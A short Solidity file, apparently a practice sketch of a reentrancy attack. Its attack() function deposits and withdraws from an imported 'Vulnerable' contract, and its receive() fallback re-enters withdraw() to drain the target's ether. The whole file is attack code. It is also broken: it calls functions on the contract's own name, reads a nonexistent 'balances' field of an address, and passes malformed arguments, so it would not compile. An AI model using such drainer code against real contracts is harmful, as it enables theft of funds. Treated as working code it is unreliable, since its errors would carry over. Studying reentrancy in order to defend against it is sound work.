// SPDX-License-Identifier: MIT 

pragma solidity >=0.5.0 <0.9.0;

import "./Vulnerable.sol";

contract vulnerable{
    Vulnerable public vuln; 

    function attack() external payable{
        vulnerable.deposit{value:1}("");
        vulnerable.withdraw();
    }

    receive() external payable{
        if(address(vuln).balances >=1 ether){
            vuln.withdraw();
        }
    }
}